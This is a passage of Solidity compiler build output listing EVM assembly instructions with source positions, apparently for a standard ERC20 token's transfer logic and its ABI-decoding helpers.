											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5534,
											"end": 5555,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 5591,
											"end": 5593,
											"name": "PUSH",
											"source": 5,
											"value": "26"
										},
										{
											"begin": 5571,
											"end": 5589,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 5571,
											"end": 5589,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 5571,
											"end": 5589,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 5564,
											"end": 5594,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 5630,
											"end": 5664,
											"name": "PUSH",
											"source": 5,
											"value": "45524332303A207472616E7366657220616D6F756E7420657863656564732062"
										},
										{
											"begin": 5610,
											"end": 5628,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 5610,
											"end": 5628,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 5610,
											"end": 5628,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 5603,
											"end": 5665,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "616C616E6365"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "D0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 5681,
											"end": 5699,
											"name": "PUSH",
											"source": 5,
											"value": "64"
										},
										{
											"begin": 5681,
											"end": 5699,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 5681,
											"end": 5699,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 5674,
											"end": 5710,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 5727,
											"end": 5746,
											"name": "PUSH",
											"source": 5,
											"value": "84"
										},
										{
											"begin": 5727,
											"end": 5746,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 5350,
											"end": 5752,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "tag",
											"source": 0,
											"value": "132"
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7908,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7914,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 7917,
											"end": 7937,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 7917,
											"end": 7937,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 7917,
											"end": 7937,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7937,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7899,
											"end": 7937,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8137,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8137,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8137,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8137,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8137,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8137,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8114,
											"end": 8127,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "PUSH",
											"source": 0,
											"value": "DDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF"
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1315,
											"end": 1333,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8163,
											"end": 8189,
											"name": "LOG3",
											"source": 0
										},
										{
											"begin": 8200,
											"end": 8237,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 12073,
											"end": 12164,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 14,
											"end": 562,
											"name": "tag",
											"source": 5,
											"value": "18"
										},
										{
											"begin": 14,
											"end": 562,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 126,
											"end": 130,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 155,
											"end": 157,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 184,
											"end": 186,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 173,
											"end": 182,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 166,
											"end": 187,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 216,
											"end": 222,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 210,
											"end": 223,
											"name": "MLOAD",
											"source": 5
										},
										{
											"begin": 259,
											"end": 265,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 254,
											"end": 256,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 243,
											"end": 252,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 239,
											"end": 257,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 232,
											"end": 266,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 284,
											"end": 285,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 294,
											"end": 434,
											"name": "tag",
											"source": 5,
											"value": "143"
										},
										{
											"begin": 294,
											"end": 434,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 308,
											"end": 314,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 305,
											"end": 306,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 302,
											"end": 315,
											"name": "LT",
											"source": 5
										},
										{
											"begin": 294,
											"end": 434,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 294,
											"end": 434,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "145"
										},
										{
											"begin": 294,
											"end": 434,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 403,
											"end": 417,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 403,
											"end": 417,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 403,
											"end": 417,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 399,
											"end": 422,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 399,
											"end": 422,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 393,
											"end": 423,
											"name": "MLOAD",
											"source": 5
										},
										{
											"begin": 369,
											"end": 386,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 369,
											"end": 386,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 369,
											"end": 386,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 388,
											"end": 390,
											"name": "PUSH",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 365,
											"end": 391,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 358,
											"end": 424,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 323,
											"end": 333,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 323,
											"end": 333,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 294,
											"end": 434,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "143"
										},
										{
											"begin": 294,
											"end": 434,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 294,
											"end": 434,
											"name": "tag",
											"source": 5,
											"value": "145"
										},
										{
											"begin": 294,
											"end": 434,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 298,
											"end": 301,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 483,
											"end": 484,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 478,
											"end": 480,
											"name": "PUSH",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 469,
											"end": 475,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 458,
											"end": 467,
											"name": "DUP7",
											"source": 5
										},
										{
											"begin": 454,
											"end": 476,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 450,
											"end": 481,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 443,
											"end": 485,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 553,
											"end": 555,
											"name": "PUSH",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 546,
											"end": 548,
											"name": "PUSH",
											"source": 5,
											"value": "1F"
										},
										{
											"begin": 542,
											"end": 549,
											"name": "NOT",
											"source": 5
										},
										{
											"begin": 537,
											"end": 539,
											"name": "PUSH",
											"source": 5,
											"value": "1F"
										},
										{
											"begin": 529,
											"end": 535,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 525,
											"end": 540,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 521,
											"end": 550,
											"name": "AND",
											"source": 5
										},
										{
											"begin": 510,
											"end": 519,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 506,
											"end": 551,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 502,
											"end": 556,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 494,
											"end": 556,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 494,
											"end": 556,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 494,
											"end": 556,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 494,
											"end": 556,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 14,
											"end": 562,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 14,
											"end": 562,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 14,
											"end": 562,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 14,
											"end": 562,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 14,
											"end": 562,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 567,
											"end": 740,
											"name": "tag",
											"source": 5,
											"value": "140"
										},
										{
											"begin": 567,
											"end": 740,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 635,
											"end": 655,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 635,
											"end": 655,
											"name": "CALLDATALOAD",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 684,
											"end": 715,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 684,
											"end": 715,
											"name": "AND",
											"source": 5
										},
										{
											"begin": 674,
											"end": 716,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 674,
											"end": 716,
											"name": "EQ",
											"source": 5
										},
										{
											"begin": 664,
											"end": 734,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "147"
										},
										{
											"begin": 664,
											"end": 734,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 730,
											"end": 731,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 727,
											"end": 728,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 720,
											"end": 732,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 664,
											"end": 734,
											"name": "tag",
											"source": 5,
											"value": "147"
										},
										{
											"begin": 664,
											"end": 734,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 567,
											"end": 740,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 567,
											"end": 740,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 567,
											"end": 740,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 567,
											"end": 740,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 745,
											"end": 999,
											"name": "tag",
											"source": 5,
											"value": "21"
										},
										{
											"begin": 745,
											"end": 999,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 813,
											"end": 819,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 821,
											"end": 827,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 874,
											"end": 876,
											"name": "PUSH",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 862,
											"end": 871,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 853,
											"end": 860,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 849,
											"end": 872,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 845,
											"end": 877,
											"name": "SLT",
											"source": 5
										},
										{
											"begin": 842,
											"end": 894,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 842,
											"end": 894,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "149"
										},
										{
											"begin": 842,
											"end": 894,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 890,
											"end": 891,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 887,
											"end": 888,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 880,
											"end": 892,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 842,
											"end": 894,
											"name": "tag",
											"source": 5,
											"value": "149"
										},
										{
											"begin": 842,
											"end": 894,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 913,
											"end": 942,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "150"
										},
										{
											"begin": 932,
											"end": 941,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 913,
											"end": 942,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "140"
										},
										{
											"begin": 913,
											"end": 942,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 913,
											"end": 942,
											"name": "tag",
											"source": 5,
											"value": "150"
										},
										{
											"begin": 913,
											"end": 942,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 903,
											"end": 942,
											"name": "SWAP5",
											"source": 5
										},
										{
											"begin": 989,
											"end": 991,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 974,
											"end": 992,
											"name": "SWAP4",
											"source": 5
										},
										{
											"begin": 974,
											"end": 992,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 974,
											"end": 992,
											"name": "SWAP4",
											"source": 5
										},
										{
											"begin": 974,
											"end": 992,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 961,
											"end": 993,
											"name": "CALLDATALOAD",
											"source": 5
										},
										{
											"begin": 961,
											"end": 993,
											"name": "SWAP4",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 745,
											"end": 999,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 1378,
											"end": 1706,
											"name": "tag",
											"source": 5,
											"value": "31"
										},
										{
											"begin": 1378,
											"end": 1706,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 1455,
											"end": 1461,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 1463,
											"end": 1469,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 1471,
											"end": 1477,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 1524,
											"end": 1526,
											"name": "PUSH",
											"source": 5,
											"value": "60"
										},
										{
											"begin": 1512,
											"end": 1521,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 1503,
											"end": 1510,
											"name": "DUP7",
											"source": 5
										},
										{
											"begin": 1499,
											"end": 1522,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 1495,
											"end": 1527,
											"name": "SLT",
											"source": 5
										},
										{
											"begin": 1492,
											"end": 1544,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 1492,
											"end": 1544,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "154"
										},
										{
											"begin": 1492,
											"end": 1544,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 1540,
											"end": 1541,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 1537,
											"end": 1538,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 1530,
											"end": 1542,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 1492,
											"end": 1544,
											"name": "tag",
											"source": 5,
											"value": "154"
										},
										{
											"begin": 1492,
											"end": 1544,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 1563,
											"end": 1592,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "155"
										},
										{
											"begin": 1582,
											"end": 1591,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 1563,
											"end": 1592,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "140"
										},
										{
											"begin": 1563,
											"end": 1592,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 1563,
											"end": 1592,
											"name": "tag",
											"source": 5,
											"value": "155"
										},
										{
											"begin": 1563,
											"end": 1592,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 1553,
											"end": 1592,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 1553,
											"end": 1592,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 1611,
											"end": 1649,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "156"
										},
										{
											"begin": 1645,
											"end": 1647,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 1634,
											"end": 1643,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 1630,
											"end": 1648,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1611,
											"end": 1649,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "140"
										},
										{
											"begin": 1611,
											"end": 1649,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 1611,
											"end": 1649,
											"name": "tag",
											"source": 5,
											"value": "156"
										},
										{
											"begin": 1611,
											"end": 1649,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 1601,
											"end": 1649,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 1601,
											"end": 1649,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 1696,
											"end": 1698,
											"name": "PUSH",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 1685,
											"end": 1694,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 1681,
											"end": 1699,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1668,
											"end": 1700,
											"name": "CALLDATALOAD",
											"source": 5
										},
										{
											"begin": 1658,
											"end": 1700,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 1658,
											"end": 1700,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 1378,
											"end": 1706,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 1378,
											"end": 1706,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 1378,
											"end": 1706,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 1378,
											"end": 1706,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 1378,
											"end": 1706,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 1378,
											"end": 1706,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 1900,
											"end": 2086,
											"name": "tag",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 1900,
											"end": 2086,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 1959,
											"end": 1965,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2012,
											"end": 2014,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 2000,
											"end": 2009,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 1991,
											"end": 1998,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 1987,
											"end": 2010,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 1983,
											"end": 2015,
											"name": "SLT",
											"source": 5
										},
										{
											"begin": 1980,
											"end": 2032,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 1980,
											"end": 2032,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "159"
										},
										{
											"begin": 1980,
											"end": 2032,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 2028,
											"end": 2029,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2025,
											"end": 2026,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 2018,
											"end": 2030,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 1980,
											"end": 2032,
											"name": "tag",
											"source": 5,
											"value": "159"
										},
										{
											"begin": 1980,
											"end": 2032,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2051,
											"end": 2080,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "160"
										},
										{
											"begin": 2070,
											"end": 2079,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 2051,
											"end": 2080,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "140"
										},
										{
											"begin": 2051,
											"end": 2080,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 2051,
											"end": 2080,
											"name": "tag",
											"source": 5,
											"value": "160"
										},
										{
											"begin": 2051,
											"end": 2080,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2041,
											"end": 2080,
											"name": "SWAP4",
											"source": 5
										},
										{
											"begin": 1900,
											"end": 2086,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1900,
											"end": 2086,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 2091,
											"end": 2351,
											"name": "tag",
											"source": 5,
											"value": "60"
										},
										{
											"begin": 2091,
											"end": 2351,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2159,
											"end": 2165,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2167,
											"end": 2173,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 2220,
											"end": 2222,
											"name": "PUSH",
											"source": 5,
											"value": "40"
										},
										{
											"begin": 2208,
											"end": 2217,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 2199,
											"end": 2206,
											"name": "DUP6",
											"source": 5
										},
										{
											"begin": 2195,
											"end": 2218,
											"name": "SUB",
											"source": 5
										},
										{
											"begin": 2191,
											"end": 2223,
											"name": "SLT",
											"source": 5
										},
										{
											"begin": 2188,
											"end": 2240,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 2188,
											"end": 2240,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "162"
										},
										{
											"begin": 2188,
											"end": 2240,
											"name": "JUMPI",
											"source": 5
										},
										{
											"begin": 2236,
											"end": 2237,
											"name": "PUSH",
											"source": 5,
											"value": "0"
										},
										{
											"begin": 2233,
											"end": 2234,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 2226,
											"end": 2238,
											"name": "REVERT",
											"source": 5
										},
										{
											"begin": 2188,
											"end": 2240,
											"name": "tag",
											"source": 5,
											"value": "162"
										},
										{
											"begin": 2188,
											"end": 2240,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2259,
											"end": 2288,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "163"
										},
										{
											"begin": 2278,
											"end": 2287,
											"name": "DUP4",
											"source": 5
										},
										{
											"begin": 2259,
											"end": 2288,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "140"
										},
										{
											"begin": 2259,
											"end": 2288,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 2259,
											"end": 2288,
											"name": "tag",
											"source": 5,
											"value": "163"
										},
										{
											"begin": 2259,
											"end": 2288,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2249,
											"end": 2288,
											"name": "SWAP2",
											"source": 5
										},
										{
											"begin": 2249,
											"end": 2288,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 2307,
											"end": 2345,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "164"
										},
										{
											"begin": 2341,
											"end": 2343,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 2330,
											"end": 2339,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 2326,
											"end": 2344,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 2307,
											"end": 2345,
											"name": "PUSH [tag]",
											"source": 5,
											"value": "140"
										},
										{
											"begin": 2307,
											"end": 2345,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 2307,
											"end": 2345,
											"name": "tag",
											"source": 5,
											"value": "164"
										},
										{
											"begin": 2307,
											"end": 2345,
											"name": "JUMPDEST",
											"source": 5
										},
										{
											"begin": 2297,
											"end": 2345,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 2297,
											"end": 2345,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 2091,
											"end": 2351,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 2091,
											"end": 2351,
											"name": "POP",
											"source": 5
										},
										{
											"begin": 2091,
											"end": 2351,
											"name": "SWAP3",
											"source": 5
										},
										{
											"begin": 2091,
											"end": 2351,
